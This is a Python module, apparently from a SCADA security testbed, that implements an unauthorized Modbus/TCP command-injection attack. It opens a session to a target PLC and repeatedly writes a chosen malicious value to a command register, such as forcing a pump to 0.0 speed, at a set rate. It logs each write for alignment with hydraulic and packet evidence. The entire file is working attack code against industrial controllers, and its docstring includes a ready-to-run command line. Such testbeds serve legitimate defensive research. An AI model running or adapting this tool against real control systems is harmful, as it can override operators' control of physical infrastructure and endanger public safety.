"""Unauthorized Modbus command injection — a real on-the-wire attacker.

Modbus/TCP has no authentication, so any host that can reach a PLC's :502 can
write its coils/holding registers. This attacker, run on a node ATTACHED TO THE
SCADA NETWORK, opens its own Modbus/TCP session to the target PLC and repeatedly
writes a malicious value into a command register (e.g. pump speed 0.0 = forced
off), overriding the legitimate MTU command on the actual network — nothing in
EPANET or the gateway is touched. (MITRE ATT&CK for ICS: T0855 Unauthorized
Command Message / T0836 Modify Parameter.)

    python -m scadavt.attacks.modbus_inject --session session.json \
        --target PLC1 --point P1_SPD --value 0.0 --hz 50 --seconds 6 \
        --log /tmp/atk.csv

Addressing is taken from the session register map for convenience; a real
attacker would reverse-engineer it from captured traffic. Every injected write
is timestamped to a CSV so it can be aligned with the hydraulic/PCAP evidence.
"""

from __future__ import annotations

import argparse
import asyncio
import csv
import json
import time
from pathlib import Path

from ..core import fieldbus as fb
from ..core.device import device_from_node


async def inject(session: dict, target: str, point_id: str, value: float,
                 hz: float, seconds: float, host=None, port=None, log_path=None):
    node = next(n for n in session["nodes"] if n["id"] == target)
    dev = device_from_node(node)
    point = dev.by_id[point_id]
    proto = node.get("protocol", "modbus")
    host = host or node.get("ip") or "127.0.0.1"
    port = int(port or node.get("port") or fb.PROTOCOLS[proto]["default_port"])
    client = fb.PROTOCOLS[proto]["client"](host, port, timeout=2.0)
    period = 1.0 / hz if hz > 0 else 0.0
    rows, n, t0 = [], 0, time.time()
    try:
        while time.time() - t0 < seconds:
            try:
                await client.write(point, value)          # a real Modbus write frame to the PLC
                n += 1
                rows.append((round(time.time() - t0, 4), host, port, point_id, value, "ok"))
            except Exception as e:
                rows.append((round(time.time() - t0, 4), host, port, point_id, value,
                             f"err:{type(e).__name__}"))
            if period:
                await asyncio.sleep(period)
    finally:
        await client.close()
    if log_path:
        with open(log_path, "w", newline="") as fh:
            w = csv.writer(fh)
            w.writerow(["t_rel_s", "target_ip", "port", "point", "value", "status"])
            w.writerows(rows)
    print(f"injected {n} Modbus writes of {point_id}={value} to {host}:{port} "
          f"over {seconds}s (~{hz}Hz)")
    return n


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--session", required=True)
    ap.add_argument("--target", required=True, help="victim PLC node id")
    ap.add_argument("--point", required=True, help="command point to overwrite")
    ap.add_argument("--value", type=float, required=True, help="malicious value to inject")
    ap.add_argument("--hz", type=float, default=50.0)
    ap.add_argument("--seconds", type=float, default=6.0)
    ap.add_argument("--host", default=None)
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--log", default=None)
    a = ap.parse_args(argv)
    session = json.loads(Path(a.session).read_text())
    asyncio.run(inject(session, a.target, a.point, a.value, a.hz, a.seconds,
                       a.host, a.port, a.log))


if __name__ == "__main__":
    main()
